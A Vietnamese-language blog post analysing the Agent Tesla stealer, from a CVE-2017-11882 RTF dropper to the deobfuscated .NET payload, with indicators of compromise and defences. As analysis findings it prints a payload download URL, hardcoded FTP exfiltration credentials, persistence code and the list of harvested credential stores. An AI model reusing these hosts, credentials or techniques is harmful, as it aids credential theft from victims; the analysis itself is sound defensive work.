---
title: "Inside AgentTesla: Techniques, Payloads, and IOC"
date: 2025-07-26 00:17:01 +0700
categories: [Notes, Cybersecurity, Malware, Reverse Engineering]
tags: [agenttesla, stealer, malware, cybersecurity, reverse engineering]
pin: false
comments: false
published: true
---

## Introduction

Trong thế giới malware, không thiếu những công cụ đánh cắp thông tin thô sơ bị phát hiện dễ dàng. Nhưng **Agent Tesla** thì khác. Xuất hiện từ năm 2014, phần mềm độc hại này đã trở thành một trong những **Remote Access Trojan (RAT) kiêm Stealer phổ biến nhất**, chuyên đánh cắp mọi thứ từ thông tin đăng nhập email, FTP, browser autofill cho đến clipboard data.

Nhiều người thắc mắc: *"Tesla? Nó có tự lái được không?"*  
Thật ra, nó không thể tự lái xe, nhưng chắc chắn có thể **“lái” máy tính của bất kỳ ai** mà nó xâm nhập, điều khiển từ xa, đánh cắp dữ liệu và âm thầm gửi về server của attacker – tất cả chỉ trong vài giây.


## Giai Đoạn 1: Dropper - "Món Quà Bất Ngờ"

### Bước Đầu: Kiểm Tra Danh Tính

Đầu tiên, chúng ta có một sample với header `50 4B 03 04`. Đây là magic number của file ZIP, nhưng trong thế giới malware, mọi thứ đều có thể bị giả mạo.

```bash
# Sử dụng công cụ file và Detect It Easy (DIE)
file sample.file
# Kết quả: File nhận diện là văn bản!
```

Một file trông như ZIP nhưng lại là văn bản - kỹ thuật giả mạo định dạng để qua mặt người dùng và phần mềm bảo mật.

### External Relationships - "Kẻ Lạ Mặt Đáng Ngờ"

Sử dụng `oleid` từ oletools, chúng ta phát hiện:
- Không có macro (an toàn hơn một chút)
- Nhưng có **External Relationships** (liên kết ngoài) - dấu hiệu nghi ngờ

```bash
oleid suspicious_document.doc
# External Relationships: SUSPICIOUS!
```

Agent Tesla thường sử dụng liên kết ngoài thay vì macro để tải về payload độc hại, tránh bị phát hiện bởi các giải pháp bảo mật chỉ kiểm tra macro.

### Phát Hiện URL Độc Hại

Sử dụng `oleobj`, chúng ta tìm thấy:
```
Frame URL: http://bit.do/fQTgM
```

Đây là một URL rút gọn, thường được dùng để che giấu địa chỉ thật của payload.

### Network Analysis - "Bắt Quả Tang Tại Trận"

Phân tích file PCAP với Network Miner, chúng ta thấy:
- HTTP GET request với pattern path traversal: `/..-...-/...dot`
- File được tải về: `dot.rtf`

Kỹ thuật path traversal giúp malware vượt qua các kiểm tra đường dẫn thông thường để tải về file độc hại.

## Giai Đoạn 2: RTF Exploitation - "Equation Không Bình Đẳng"

### CVE-2017-11882: Lỗ Hổng "Cổ Điển"

File `dot.rtf` khai thác CVE-2017-11882 - lỗ hổng trong Microsoft Equation Editor (`EQNEDT32.EXE`), cho phép thực thi mã tùy ý khi mở file RTF.

```bash
rtfobj dot.rtf
# Found 2 objects: Not well-formed OLE objects
```

Object thứ nhất: rỗng  
Object thứ hai: chứa shellcode

### Shellcode Analysis - "Giải Mã Bí Ẩn"

Sử dụng `xorsearch` với tham số `-W`:
```bash
xorsearch -W object_02.bin
# Found potential shellcode at offset: 0x1FE
```

Đưa vào IDA Pro, chúng ta thấy:
```assembly
call    next_instruction
next_instruction:
    pop     ebx          ; Lấy địa chỉ hiện tại
    jmp     loc_1FE      ; Nhảy đến shellcode thực
```

Đây là kỹ thuật lấy địa chỉ shellcode động, phổ biến trong khai thác lỗ hổng.

### Dynamic Analysis với scDbg

```bash
scdbg.exe -f shellcode.bin -i 0x1FE
```

Shellcode thực hiện:
```
Download file từ: http://192.3.141.131/os/vbc.exe
```

## Giai Đoạn 3: Main Payload Analysis - "Chương Trình Chính Bắt Đầu"

### Nhận Dạng Malware

```bash
# MD5 Hash check trên VirusTotal
# Kết quả: Agent Tesla detected by nhiều engine
```

### PE Analysis với PEStudio

Thông tin thú vị:
- Import `MSVBVM60.DLL` (Visual Basic 6.0 runtime, thường dùng cho malware packer)
- String `CryptDecrypt` tại offset `00019E2C` (hàm giải mã dữ liệu)

### Memory Dumping - "Săn Tìm Kho Báu"

Sử dụng x64dbg:
```assembly
bp 00019DDC    ; Breakpoint tại CryptDecrypt
```

Sau khi reach breakpoint:
- Dump size: `36200` hex bytes
- Dữ liệu được giải mã tại runtime

### .NET Analysis - "Cuộc Chiến Với Obfuscation"

File dump ra là .NET assembly, mở bằng dnSpy:

```csharp
// Tất cả đều bị obfuscated!
public static void A()  // Main entry point
{
    // Mã khó đọc, đã bị làm rối
}
```

## Giai Đoạn 4: Deobfuscation - "Dịch Thuật Ngôn Ngữ Ngoài Hành Tinh"

### String Decryption Algorithm

Phát hiện pattern:
```python
def decrypt_string(byte_array, index):
    result = []
    for i, byte in enumerate(byte_array):
        decrypted_byte = byte ^ i ^ 170
        result.append(chr(decrypted_byte))
    return ''.join(result)
```

Đây là kỹ thuật XOR kết hợp vị trí và giá trị cố định để mã hóa chuỗi.

### Sử dụng de4dot

```bash
de4dot.exe --string encrypted_sample.exe --strtyp delegate --strtok 0x600022E
```

Sau khi giải mã, code trở nên dễ đọc hơn.

### Phân Tích Code Sau Khi Deobfuscate

#### Security Protocol Setup
```csharp
ServicePointManager.SecurityProtocol = 
    SecurityProtocolType.Ssl3 | 
    SecurityProtocolType.Tls | 
    SecurityProtocolType.Tls11 | 
    SecurityProtocolType.Tls12;
```
*Thiết lập hỗ trợ nhiều giao thức SSL/TLS để đảm bảo kết nối với C2 server.*

#### Persistence Mechanism
```csharp
// Copy to startup folder
string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
// Ẩn file với thuộc tính System + Hidden
File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
```
*Kỹ thuật duy trì sự tồn tại trên hệ thống.*

#### Timer-based Operations
```csharp
Timer timer1 = new Timer(30000);  // 30 giây - Heartbeat
Timer timer2 = new Timer(120000); // 2 phút - Data exfiltration  
Timer timer3 = new Timer(60000);  // 1 phút - Command check
```

Ba timer chạy song song để thực hiện các chức năng khác nhau.

### Functionality Analysis

#### 1. TOR Integration
```csharp
// Download TOR: tor-win32-0.4.3.6.zip
// Thiết lập SOCKS proxy để ẩn danh khi giao tiếp với C2
```

#### 2. Credential Harvesting
Targets include:
- **DynDNS**: `DynDNS\Updater\config.dyndns`
- **FTP Clients**: FileZilla, CoreFTP, FlashFXP
- **Email**: Outlook profiles
- **Remote Access**: UltraVNC

#### 3. Data Exfiltration
```csharp
// FTP Credentials (hardcoded)
string ftpServer = "ftp.austrianhaus.com";
string username = "wx@austrianhaus.com";
string password = "740583Dd";
```

## IOC Summary - "Tóm Tắt Bằng Chứng Tội Phạm"

### Network Indicators
| Type   | Indicator               | Description         |
| ------ | ----------------------- | ------------------- |
| Domain | `http://WrYvjJ.com`     | C2 server           |
| URL    | `https://api.ipify.org` | IP check service    |
| FTP    | `ftp.austrianhaus.com`  | Exfiltration server |

### File Indicators
- **Downloaded**: `tor-win32-0.4.3.6.zip`
- **Dropped**: `%TEMP%\TBH`
- **Persistence**: `%startupfolder%\%insfolder%\%insname%`

### Registry Indicators
```registry
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\
```

## Kết Luận: Bài Học Từ Agent Tesla

Agent Tesla là một ví dụ điển hình cho:

1. **Social Engineering**: Sử dụng file văn bản giả mạo làm vector tấn công ban đầu
2. **Exploit Chain**: CVE-2017-11882 → Shellcode → Payload download
3. **Stealth Techniques**: Obfuscation + TOR + Multi-stage loading
4. **Persistence**: Registry manipulation + Startup folder
5. **Data Theft**: Thu thập thông tin đăng nhập toàn diện

### Bảo Vệ Khỏi Agent Tesla

- **Update Office**: Vá lỗ hổng CVE-2017-11882
- **Email Security**: Cẩn thận với file đính kèm
- **Network Monitoring**: Chặn các domain/IP đáng ngờ
- **Endpoint Protection**: Phát hiện malware .NET
- **User Training**: Giáo dục về phishing

### Lời Kết

Agent Tesla không phải là Tesla của Elon Musk, nhưng nó cũng "cách mạng" theo cách mà chúng ta không mong muốn!

Qua bài phân tích này, hy vọng các bạn đã hiểu rõ hơn về attack chain, kỹ thuật và cách phòng chống. "With great power comes great responsibility" - và malware analyst chính là những người bảo vệ cyberspace!

---

**Happy hunting, security researchers!**